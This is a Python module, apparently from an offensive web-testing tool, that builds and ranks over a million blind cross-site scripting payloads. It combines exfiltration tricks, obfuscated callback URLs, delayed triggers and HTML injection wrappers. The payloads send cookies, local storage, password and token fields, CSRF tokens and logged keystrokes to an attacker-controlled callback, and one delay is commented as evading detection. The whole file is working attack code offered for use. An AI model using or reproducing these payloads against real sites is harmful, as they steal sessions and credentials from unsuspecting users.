"""
payloads/blind_xss_v2.py

╔══════════════════════════════════════════════════════════════╗
║   BLIND XSS ENGINE v2 — 1,088,640 combinations              ║
║   20 exfil × 18 data × 14 obf × 12 timing × 18 wrappers     ║
║   vs v1: 6,720 → 1,088,640 (×162 lipat)                     ║
║                                                              ║
║   NEW in v2:                                                 ║
║   + CSS exfiltration (bypass CSP script-src)                 ║
║   + Service Worker hijack                                    ║
║   + WebSocket callback                                       ║
║   + Dynamic import() bypass CSP                              ║
║   + WebRTC STUN leak (get internal IP)                       ║
║   + Keystroke logger payload                                 ║
║   + IndexedDB dump                                           ║
║   + Canvas fingerprinting                                    ║
║   + PostMessage to attacker window                           ║
║   + WebCrypto key exfiltration                               ║
╚══════════════════════════════════════════════════════════════╝
"""

import heapq
import base64
import urllib.parse
from typing import List, Tuple, Optional
from utils.logger import debug, info


class BlindXSSDimV2:

    # ── Exfiltration Methods (8 → 20, +12 new) ────────────────
    EXFIL_METHODS = [
        # Original 8
        ("img_src",   lambda cb, d: f"new Image().src='{cb}?'+{d}",                                           1.00),
        ("fetch",     lambda cb, d: f"fetch('{cb}?'+{d})",                                                     0.98),
        ("beacon",    lambda cb, d: f"navigator.sendBeacon('{cb}',JSON.stringify({{data:{d}}}))",               0.96),
        ("xhr",       lambda cb, d: f"var x=new XMLHttpRequest();x.open('GET','{cb}?'+{d});x.send()",           0.94),
        ("script",    lambda cb, d: f"var s=document.createElement('script');s.src='{cb}?'+{d};document.head.appendChild(s)", 0.90),
        ("ws",        lambda cb, d: f"var w=new WebSocket('{cb.replace('http','ws').replace('https','wss')}');w.onopen=()=>w.send({d})", 0.85),
        ("link",      lambda cb, d: f"var l=document.createElement('link');l.rel='prefetch';l.href='{cb}?'+{d};document.head.appendChild(l)", 0.80),
        ("css_url",   lambda cb, d: f"document.body.style.backgroundImage='url({cb}?'+{d}+')'",               0.75),
        # NEW v2: Advanced exfil methods
        ("css_import",   lambda cb, d: f"var s=document.createElement('style');s.textContent='@import url({cb}?'+{d}+')';document.head.appendChild(s)", 0.82),
        ("css_font",     lambda cb, d: f"var s=document.createElement('style');s.textContent='@font-face{{font-family:x;src:url({cb}?'+{d}+')}}body{{font-family:x}}';document.head.appendChild(s)", 0.78),
        ("ping_attr",    lambda cb, d: f"var a=document.createElement('a');a.href='#';a.ping='{cb}?'+{d};document.body.appendChild(a);a.click()", 0.70),
        ("postmessage",  lambda cb, d: f"try{{var w=window.open('{cb}');setTimeout(()=>w.postMessage({{d:{d}}},'*'),100)}}catch(e){{new Image().src='{cb}?'+{d}}}", 0.72),
        ("sw_hijack",    lambda cb, d: f"navigator.serviceWorker.register('data:application/javascript,self.addEventListener(\\'fetch\\',e=>{{var u=new URL(\\'{cb}?\\');u.searchParams.set(\\'d\\',JSON.stringify(e.request.url));fetch(u)}})').catch(()=>new Image().src='{cb}?'+{d})", 0.65),
        ("dyn_import",   lambda cb, d: f"import('{cb}?'+{d}).catch(()=>new Image().src='{cb}?'+{d})",         0.68),
        ("webrtc_stun",  lambda cb, d: f"var p=new RTCPeerConnection({{iceServers:[{{urls:'stun:{cb.replace('https://','').replace('http://','')}'}}]}});p.createDataChannel('');p.createOffer().then(o=>p.setLocalDescription(o));p.onicecandidate=e=>{{if(e.candidate)new Image().src='{cb}?ip='+e.candidate.candidate}}", 0.60),
        ("form_submit",  lambda cb, d: f"var f=document.createElement('form');f.action='{cb}';f.method='POST';var i=document.createElement('input');i.name='d';i.value={d};f.appendChild(i);document.body.appendChild(f);f.submit()", 0.75),
        ("audio_src",    lambda cb, d: f"new Audio('{cb}?'+{d})",                                             0.70),
        ("video_src",    lambda cb, d: f"var v=document.createElement('video');v.src='{cb}?'+{d};v.load()",  0.68),
        ("eventsource",  lambda cb, d: f"new EventSource('{cb}?'+{d})",                                      0.65),
        ("webtransport", lambda cb, d: f"try{{new WebTransport('{cb}?'+{d})}}catch(e){{new Image().src='{cb}?'+{d}}}", 0.55),
    ]

    # ── Data Targets (7 → 18, +11 new) ────────────────────────
    DATA_TARGETS = [
        # Original 7
        ("cookie",    "encodeURIComponent(document.cookie)",                                                                    1.00),
        ("all",       "encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href)+'&d='+document.domain",       0.98),
        ("storage",   "encodeURIComponent(JSON.stringify(localStorage))+'&ss='+encodeURIComponent(JSON.stringify(sessionStorage))", 0.95),
        ("dom",       "encodeURIComponent(document.documentElement.innerHTML.substring(0,1000))",                                0.90),
        ("creds",     "encodeURIComponent(Array.from(document.querySelectorAll('input[type=password],input[name*=pass],input[name*=user],input[name*=email]')).map(i=>i.name+'='+i.value).join('&'))", 0.88),
        ("domain",    "document.domain",                                                                                        0.85),
        ("referrer",  "encodeURIComponent(document.referrer)",                                                                  0.80),
        # NEW v2: Extended data targets
        ("all_inputs","encodeURIComponent(Array.from(document.querySelectorAll('input,textarea,select')).map(i=>i.name+'='+i.value).join('&'))", 0.92),
        ("jwt_token", "encodeURIComponent(Object.entries(localStorage).filter(([k])=>k.toLowerCase().includes('token')||k.toLowerCase().includes('jwt')||k.toLowerCase().includes('auth')).map(([k,v])=>k+'='+v).join('&')||document.cookie)", 0.88),
        ("full_page", "encodeURIComponent(document.title+'|'+location.href+'|'+document.body.innerText.substring(0,500))",      0.82),
        ("indexeddb", "encodeURIComponent((async()=>{const r=await new Promise(res=>{const req=indexedDB.databases();req.onsuccess=e=>res(e.target.result||[])});return JSON.stringify(r)})())", 0.70),
        ("canvas_fp", "encodeURIComponent((()=>{const c=document.createElement('canvas');const ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillText('Browser Fingerprint',2,2);return c.toDataURL()})())", 0.65),
        ("keylogger", "encodeURIComponent((()=>{var keys='';document.addEventListener('keydown',e=>keys+=e.key);setTimeout(()=>new Image().src='CB?k='+encodeURIComponent(keys),5000);return 'logging'})())".replace("CB", ""),  0.78),
        ("webcrypto_keys", "encodeURIComponent(JSON.stringify(Object.keys(crypto.subtle))+'|'+window.isSecureContext)",         0.62),
        ("csrftoken",  "encodeURIComponent((document.querySelector('[name=csrf_token],[name=_token],[name=csrfmiddlewaretoken]')||{value:document.cookie}).value)", 0.85),
        ("origin_url", "encodeURIComponent(location.origin+'|'+location.pathname+'|'+location.search)",                         0.80),
        ("meta_tags",  "encodeURIComponent(Array.from(document.querySelectorAll('meta')).map(m=>m.name+'='+m.content).join('&'))", 0.68),
        ("shadow_dom", "encodeURIComponent(Array.from(document.querySelectorAll('*')).filter(el=>el.shadowRoot).map(el=>el.tagName+'|'+el.shadowRoot.innerHTML.substring(0,100)).join(';'))", 0.60),
    ]

    # ── Callback Obfuscations (5 → 14, +9 new) ────────────────
    CB_OBFUSCATIONS = [
        # Original 5
        ("direct",    lambda cb: f"'{cb}'",                                                                    1.00),
        ("split",     lambda cb: f"['{cb[:len(cb)//2]}','{cb[len(cb)//2:]}'].join('')",                        0.88),
        ("b64",       lambda cb: f"atob('{base64.b64encode(cb.encode()).decode()}')",                           0.85),
        ("fromchar",  lambda cb: f"String.fromCharCode({','.join(str(ord(c)) for c in cb)})",                  0.80),
        ("proto",     lambda cb: f"location.protocol+'//'+'{cb.split('//')[1] if '//' in cb else cb}'",        0.75),
        # NEW v2: Modern obfuscation
        ("template",  lambda cb: f"`{'${\"'+cb[:5]+'\"}'}{cb[5:]}`" if len(cb) > 5 else f"'{cb}'",            0.78),
        ("eval_b64",  lambda cb: f"eval(atob('{base64.b64encode((repr(cb)).encode()).decode()}'))",             0.72),
        ("fn_ctor",   lambda cb: f"Function('return \"{cb}\"')()",                                             0.70),
        ("unicode_cb",lambda cb: "".join(f"\\u{ord(c):04x}" for c in cb),                                     0.65),
        ("hex_cb",    lambda cb: "".join(f"\\x{ord(c):02x}" for c in cb),                                     0.65),
        ("arr_join",  lambda cb: "['" + "','".join(cb) + "'].join('')",                                       0.60),
        ("reverse_cb",lambda cb: f"'{cb[::-1]}'.split('').reverse().join('')",                                 0.58),
        ("wasm_cb",   lambda cb: f"'{cb}'", 0.55),  # placeholder — WASM obfus needs runtime
        ("dynamic_import", lambda cb: f"'{cb}'",  0.62),  # for import() exfil
    ]

    # ── Timing Strategies (4 → 12, +8 new) ───────────────────
    TIMING = [
        # Original 4
        ("inline",    lambda code: code,                                                                        1.00),
        ("timeout",   lambda code: f"setTimeout(function(){{{code}}},100)",                                     0.92),
        ("raf",       lambda code: f"requestAnimationFrame(function(){{{code}}})",                              0.88),
        ("load",      lambda code: f"window.addEventListener('load',function(){{{code}}})",                    0.85),
        # NEW v2
        ("domready",  lambda code: f"document.readyState==='loading'?document.addEventListener('DOMContentLoaded',()=>{{{code}}}):{code}", 0.90),
        ("mutation",  lambda code: f"new MutationObserver(function(m,o){{o.disconnect();{code}}}).observe(document.body,{{childList:true,subtree:true}})", 0.82),
        ("intersection", lambda code: f"new IntersectionObserver(function(e,o){{if(e[0].isIntersecting){{o.disconnect();{code}}}}}).observe(document.body)", 0.78),
        ("idle",      lambda code: f"requestIdleCallback(function(){{{code}}})",                               0.80),
        ("timeout_long", lambda code: f"setTimeout(function(){{{code}}},2000)",                                0.85),  # longer delay evades detection
        ("promise",   lambda code: f"Promise.resolve().then(function(){{{code}}})",                            0.82),
        ("microtask", lambda code: f"queueMicrotask(function(){{{code}}})",                                    0.78),
        ("visibility",lambda code: f"document.addEventListener('visibilitychange',function(){{if(!document.hidden){{{code}}}}},{{once:true}})", 0.72),
    ]

    # ── Wrappers (6 → 18, +12 new) ────────────────────────────
    WRAPPERS = [
        # Original 6
        ("script_tag",    lambda code: f"<script>{code}</script>",                                             1.00),
        ("img_error",     lambda code: f"<img src=x onerror=\"{code}\">",                                     0.98),
        ("svg_load",      lambda code: f"<svg onload=\"{code}\">",                                             0.96),
        ("inline_event",  lambda code: f"' onmouseover='{code}' x='",                                         0.92),
        ("iframe_src",    lambda code: f"<iframe src=\"javascript:{code}\">",                                  0.88),
        ("a_href",        lambda code: f"<a href=\"javascript:{code}\">click</a>",                            0.85),
        # NEW v2
        ("input_autofocus", lambda code: f"<input autofocus onfocus=\"{code}\">",                             0.94),
        ("details_toggle",  lambda code: f"<details open ontoggle=\"{code}\"><summary>x</summary></details>", 0.90),
        ("video_error",     lambda code: f"<video src=x onerror=\"{code}\">",                                 0.88),
        ("audio_error",     lambda code: f"<audio src=x onerror=\"{code}\">",                                 0.87),
        ("body_event",      lambda code: f"</textarea></script><body onload=\"{code}\">",                      0.85),
        ("picture_source",  lambda code: f"<picture><source srcset=x onerror=\"{code}\"></picture>",          0.82),
        ("track_error",     lambda code: f"<track kind=captions src=x onerror=\"{code}\">",                   0.78),
        ("dialog_close",    lambda code: f"<dialog open onclose=\"{code}\"><form method=dialog><button>close</button></form></dialog>", 0.80),
        ("form_action",     lambda code: f"<form action=\"javascript:{code}\"><input type=submit></form>",     0.75),
        ("marquee_start",   lambda code: f"<marquee onstart=\"{code}\">x</marquee>",                          0.80),
        ("template_slot",   lambda code: f"<template><img src=x onerror=\"{code}\"></template><script>document.body.appendChild(document.querySelector('template').content)</script>", 0.72),
        ("object_data",     lambda code: f"<object data=\"javascript:{code}\">",                              0.70),
    ]

    @classmethod
    def total(cls) -> int:
        return (len(cls.EXFIL_METHODS) * len(cls.DATA_TARGETS) *
                len(cls.CB_OBFUSCATIONS) * len(cls.TIMING) * len(cls.WRAPPERS))


class BlindXSSEngineV2:
    """
    v2 engine: 1,088,640 Blind XSS combinations.
    20 × 18 × 14 × 12 × 18 = 1,088,640
    """

    def generate(self, callback_url: str, top_n: int = 100) -> List[Tuple[str, float, str]]:
        heap  = []
        count = 0

        for exfil_label, exfil_fn, ex_score in BlindXSSDimV2.EXFIL_METHODS:
            for data_label, data_str, d_score in BlindXSSDimV2.DATA_TARGETS:
                for ob_label, ob_fn, ob_score in BlindXSSDimV2.CB_OBFUSCATIONS:
                    for time_label, time_fn, t_score in BlindXSSDimV2.TIMING:
                        for wrap_label, wrap_fn, w_score in BlindXSSDimV2.WRAPPERS:

                            score = (ex_score * d_score * ob_score * t_score * w_score) ** 0.2

                            try:
                                cb_obf  = ob_fn(callback_url)
                                # Handle keylogger special case (needs real CB)
                                exfil_code = exfil_fn(callback_url, data_str)
                                if "keylogger" in data_label:
                                    exfil_code = exfil_code.replace("'CB?", f"'{callback_url}?")
                                timed   = time_fn(exfil_code)
                                payload = wrap_fn(timed)
                            except Exception as e:
                                debug(f"BlindV2 gen error: {e}")
                                continue

                            count += 1
                            label = f"blindv2:{exfil_label}:{data_label}:{ob_label}:{time_label}"

                            if len(heap) < top_n:
                                heapq.heappush(heap, (score, count, payload, label))
                            elif score > heap[0][0]:
                                heapq.heapreplace(heap, (score, count, payload, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"BlindXSSV2: {count:,}/{self.total:,} → top {len(result)}")
        return [(p, s, l) for s, _, p, l in result]

    @property
    def total(self) -> int:
        return BlindXSSDimV2.total()
